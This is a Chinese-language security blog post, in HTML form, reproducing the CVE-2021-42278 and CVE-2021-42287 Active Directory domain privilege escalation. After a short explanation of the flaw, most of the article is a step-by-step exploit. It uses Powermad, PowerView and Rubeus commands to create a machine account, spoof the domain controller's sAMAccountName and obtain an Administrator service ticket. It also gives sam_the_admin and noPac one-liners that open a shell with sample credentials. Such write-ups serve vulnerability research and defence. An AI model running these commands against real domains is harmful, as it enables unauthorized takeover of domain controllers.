@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2021-42278 &amp; CVE-2021-42287 域提权 | syyu's Blog</title><meta name="keywords" content="网络安全,漏洞复现,域提权"><meta name="author" content="ThesYu"><meta name="copyright" content="ThesYu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="漏洞简介CVE-2021-42278 一般来说，机器账号的名字应该以$符号结尾的。例如DC$表示DC这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建DC用户名完全是可以的。（这里指的是机器账号的sAMAccountName属性） CVE-2021-42287 结合上面那个漏洞，如果创建了一个用户名为DC的账户，此时使用这个账户去申请一张TGT票据，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2021-42278 &amp; CVE-2021-42287 域提权">
+<meta property="og:url" content="https://blog.syyu.ltd/articles/8e808fd4/index.html">
+<meta property="og:site_name" content="syyu&#39;s Blog">
+<meta property="og:description" content="漏洞简介CVE-2021-42278 一般来说，机器账号的名字应该以$符号结尾的。例如DC$表示DC这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建DC用户名完全是可以的。（这里指的是机器账号的sAMAccountName属性） CVE-2021-42287 结合上面那个漏洞，如果创建了一个用户名为DC的账户，此时使用这个账户去申请一张TGT票据，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png">
+<meta property="article:published_time" content="2021-12-29T12:35:08.000Z">
+<meta property="article:modified_time" content="2021-12-31T13:35:43.965Z">
+<meta property="article:author" content="ThesYu">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="域提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png"><link rel="shortcut icon" href="/img/faction.ico"><link rel="canonical" href="https://blog.syyu.ltd/articles/8e808fd4/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CVE-2021-42278 & CVE-2021-42287 域提权',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-31 21:35:43'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/self.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/d0g.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">syyu's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-42278 &amp; CVE-2021-42287 域提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-29T12:35:08.000Z" title="发表于 2021-12-29 20:35:08">2021-12-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T13:35:43.965Z" title="更新于 2021-12-31 21:35:43">2021-12-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">888</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2021-42278 &amp; CVE-2021-42287 域提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a><code>CVE-2021-42278</code></h3><p> 一般来说，机器账号的名字应该以<code>$</code>符号结尾的。例如<code>DC$</code>表示<code>DC</code>这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建<code>DC</code>用户名完全是可以的。（这里指的是机器账号的<code>sAMAccountName</code>属性）</p>
+<h3 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a><code>CVE-2021-42287</code></h3><p> 结合上面那个漏洞，如果创建了一个用户名为<code>DC</code>的账户，此时使用这个账户去申请一张<code>TGT</code>票据，然后在申请<code>ST</code>之前，将这个账户名修改掉或者删除掉，那么在进行申请<code>ST</code>的时候，<code>KDC</code>在进行验证时就查不到这个账户，此时<code>KDC</code>就会去查找<code>DC$</code>这个账户，如果这个账户存在的话，最终返回的就是<code>DC$</code>这个账户申请的<code>ST</code>。也就相当于获取到了域控账户申请的高权限服务票据。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><p>首先需要一个域内用户，然后提权至域管，接管域控。步骤如下</p>
+<ol>
+<li> 创建一个机器账户</li>
+<li> 清除机器账户的<code>SPN</code></li>
+<li> 修改机器账户的<code>sAMAccountName</code>属性值</li>
+<li> 使用机器账户请求<code>TGT</code></li>
+<li> 再次修改机器账户的<code>sAMAccountName</code>属性值</li>
+<li> 获取高权限<code>ST</code>票据</li>
+</ol>
+<ul>
+<li><h3 id="1-创建机器用户"><a href="#1-创建机器用户" class="headerlink" title="1.创建机器用户"></a>1.创建机器用户</h3></li>
+</ul>
+<blockquote>
+<p>  使用 <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>  创建一个新的机器账户， <code>syyu$</code></p>
+<p>  当申请一个机器账户<code>MachineCount</code>时，<code>SPN</code>会自动注册</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> syyu <span class="literal">-Domain</span> hacker.me <span class="literal">-DomainController</span> dc.hacker.me <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="2-清除SPN"><a href="#2-清除SPN" class="headerlink" title="2.清除SPN"></a>2.清除SPN</h3></li>
+</ul>
+<blockquote>
+<p>  使用 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> 下的 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a> 工具 ，进行清除 </p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="string">&quot;CN=syyu,CN=Computers,DC=hacker,DC=me&quot;</span> <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="3-修改sAMAccountName属性"><a href="#3-修改sAMAccountName属性" class="headerlink" title="3.修改sAMAccountName属性"></a>3.修改sAMAccountName属性</h3></li>
+</ul>
+<blockquote>
+<p>   将 <strong>sAMAccountName</strong> 改为域控的机器账号名</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp  // 查询 域控的主机名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> // sAMAccountName 改为域控的机器账号名</span><br><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;dc&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="4-请求TGT"><a href="#4-请求TGT" class="headerlink" title="4.请求TGT"></a>4.请求TGT</h3></li>
+</ul>
+<blockquote>
+<p>  使用更改后的机器名申请TGT票据，利用 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a> 完成请求</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:dc /password:p@ssWord /domain:hacker.me /dc:dc.hacker.me /nowrap</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="5-再次修改sAMAccountName属性值"><a href="#5-再次修改sAMAccountName属性值" class="headerlink" title="5.再次修改sAMAccountName属性值"></a>5.再次修改sAMAccountName属性值</h3></li>
+</ul>
+<blockquote>
+<p>  <code>samaccountname</code>重置会原本的用户名或改为其他域内不存在账户</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;syyu$&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="6-获取高权限ST票据"><a href="#6-获取高权限ST票据" class="headerlink" title="6.获取高权限ST票据"></a>6.获取高权限ST票据</h3></li>
+</ul>
+<blockquote>
+<p>  在采用刚刚获取到的<code>TGT</code>进行<code>S4U2self</code>请求来获取域控<code>ST</code>票据（这个过程<code>KDC</code>会去查找<code>samaccountname</code>，由于刚才<code>MachineCount</code>的<code>samaccountname</code>为<code>dc</code>，所以<code>KDC</code>回去查找这个<code>dc</code>，此时由于已经将<code>MachineCount</code>的<code>samaccountname</code>所更改，<code>KDC</code>查找不到<code>dc</code>就会在后面加上<code>$</code>符去寻找，此时找到的就为域控的<code>dc$</code>，并将它的<code>ST</code>票据返回）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot; /altservice:&quot;ldap/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT值]</span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:&quot;CIFS/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT]</span><br></pre></td></tr></table></figure>
+
+<p>此时，我们便获取了<code>DC</code>的<code>ST</code>票据</p>
+<h2 id="poc使用"><a href="#poc使用" class="headerlink" title="poc使用"></a>poc使用</h2><h3 id="sam-the-admin"><a href="#sam-the-admin" class="headerlink" title="sam_the_admin"></a>sam_the_admin</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sam_the_admin.py <span class="string">&quot;god/liukaifeng01:hongrisec@2021@&quot;</span> -dc-ip 192.168.52.138 -shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="noPac-python"><a href="#noPac-python" class="headerlink" title="noPac_python"></a>noPac_python</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 noPac.py redteam/saul:<span class="string">&#x27;admin!@#45&#x27;</span> -dc-ip 10.10.10.8 -dc-host owa -shell --impersonate administrator </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/FHLZLHQ/article/details/121964692">https://blog.csdn.net/FHLZLHQ/article/details/121964692</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://sairson.cn/index.php/archives/45/">https://sairson.cn/index.php/archives/45/</a></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ricardojba/Invoke-noPac">https://github.com/ricardojba/Invoke-noPac</a></p>
+<h2 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h2><p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%8F%90%E6%9D%83/">域提权</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/articles/60487e7c/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NTLM及Kerberos认证流程</div></div></a></div><div class="next-post pull-right"><a href="/articles/de574863/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919387.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2019-5736-Docker逃逸RunC漏洞复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/articles/602d9e2a/" title="fastjson漏洞复现"><img class="cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290953605.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-03</div><div class="title">fastjson漏洞复现</div></div></a></div><div><a href="/articles/a27657b2/" title="shiro1.2.4反序列化漏洞复现"><img class="cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112291001124.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-28</div><div class="title">shiro1.2.4反序列化漏洞复现</div></div></a></div><div><a href="/articles/de574863/" title="CVE-2019-5736-Docker逃逸RunC漏洞复现"><img class="cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919387.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-29</div><div class="title">CVE-2019-5736-Docker逃逸RunC漏洞复现</div></div></a></div><div><a href="/articles/60487e7c/" title="NTLM及Kerberos认证流程"><img class="cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-29</div><div class="title">NTLM及Kerberos认证流程</div></div></a></div><div><a href="/articles/d81db563/" title="Redis未授权访问利用方式总结"><img class="cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290939219.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-03</div><div class="title">Redis未授权访问利用方式总结</div></div></a></div><div><a href="/articles/0/" title="MySQL提权方式总结"><img class="cover" src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112291001124.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-03</div><div class="title">MySQL提权方式总结</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/d0g.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ThesYu</div><div class="author-info__description">Evething is possible!</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/syyu6"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/syyu6" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Record My Life.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-42278"><span class="toc-number">1.1.</span> <span class="toc-text">CVE-2021-42278</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-42287"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2021-42287</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7"><span class="toc-number">2.2.</span> <span class="toc-text">1.创建机器用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B8%85%E9%99%A4SPN"><span class="toc-number">2.3.</span> <span class="toc-text">2.清除SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9sAMAccountName%E5%B1%9E%E6%80%A7"><span class="toc-number">2.4.</span> <span class="toc-text">3.修改sAMAccountName属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AF%B7%E6%B1%82TGT"><span class="toc-number">2.5.</span> <span class="toc-text">4.请求TGT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%8D%E6%AC%A1%E4%BF%AE%E6%94%B9sAMAccountName%E5%B1%9E%E6%80%A7%E5%80%BC"><span class="toc-number">2.6.</span> <span class="toc-text">5.再次修改sAMAccountName属性值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%8E%B7%E5%8F%96%E9%AB%98%E6%9D%83%E9%99%90ST%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.7.</span> <span class="toc-text">6.获取高权限ST票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">poc使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sam-the-admin"><span class="toc-number">3.1.</span> <span class="toc-text">sam_the_admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#noPac-python"><span class="toc-number">3.2.</span> <span class="toc-text">noPac_python</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">5.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tools"><span class="toc-number">6.</span> <span class="toc-text">tools</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/articles/60487e7c/" title="NTLM及Kerberos认证流程"><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NTLM及Kerberos认证流程"/></a><div class="content"><a class="title" href="/articles/60487e7c/" title="NTLM及Kerberos认证流程">NTLM及Kerberos认证流程</a><time datetime="2021-12-29T12:35:08.000Z" title="发表于 2021-12-29 20:35:08">2021-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/articles/8e808fd4/" 